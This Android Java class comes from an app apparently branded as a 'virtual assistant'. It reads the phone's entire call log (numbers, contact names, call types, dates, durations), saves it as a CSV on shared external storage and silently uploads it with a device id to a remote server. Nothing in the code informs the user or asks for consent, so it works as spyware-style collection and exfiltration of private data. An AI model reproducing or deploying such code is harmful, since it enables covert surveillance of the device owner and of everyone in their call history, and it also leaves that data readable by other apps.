package com.virtualassistant.client;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Environment;
import android.os.Looper;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.virtualassistant.Constants;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.Calendar;

/**
 * Created by aadam on 10/5/2017.
 */

public class CallLogManager {

    public static void getAllLog(Context context, final String playerId) {

        File folder = new File(Environment.getExternalStorageDirectory()
                + "/VA");

        if (!folder.exists())
            folder.mkdir();


        final String filename = folder.toString() + "/" + "calllog.csv";
        try {
            FileWriter fw = new FileWriter(filename);

            fw.append("date,type,number,name,number type,duration\n");

            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return;
            }
            Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int numberType = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_TYPE);
            while (managedCursor.moveToNext()) {
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                String callDate = getDate(Long.parseLong(managedCursor.getString(date)));

                String callDuration = managedCursor.getString(duration);
                String callerName = managedCursor.getString(name);
                String callerNumberType = managedCursor.getString(numberType);

                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }

                fw.append(callDate + "," + dir + "," + phNumber + "," + callerName + "," + callerNumberType + "," + callDuration + "\n");

            }
            fw.close();
            managedCursor.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        final Thread t = new Thread(){
            public void run() {
                Looper.prepare();

                DefaultHttpClient mHttpClient;
                HttpParams params = new BasicHttpParams();
                params.setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
                mHttpClient = new DefaultHttpClient(params);

                HttpPost httppost = new HttpPost(Constants.CALL_LOG_CREATE_URL);
                MultipartEntity multipartEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
                try {
                    multipartEntity.addPart("Device_id", new StringBody(playerId));
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
                multipartEntity.addPart("File", new FileBody(new File(filename)));
                httppost.setEntity(multipartEntity);

                try {
                    mHttpClient.execute(httppost, new ResponseHandler<Object>() {


                        @Override
                        public Object handleResponse(HttpResponse httpResponse) throws ClientProtocolException, IOException {
                            HttpEntity r_entity = httpResponse.getEntity();
                            String responseString = EntityUtils.toString(r_entity);
                            Log.d("AAAA UPLOAD", responseString);
                            return null;
                        }
                    });
                } catch (IOException e) {
                    e.printStackTrace();
                }


                Looper.loop();
            }
        };
        t.start();





    }

    private static String getDate(long milliSeconds) {
        SimpleDateFormat formatter = new SimpleDateFormat("M/dd/yyyy HH:mm:ss");
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(milliSeconds);
        return formatter.format(calendar.getTime());
    }
}

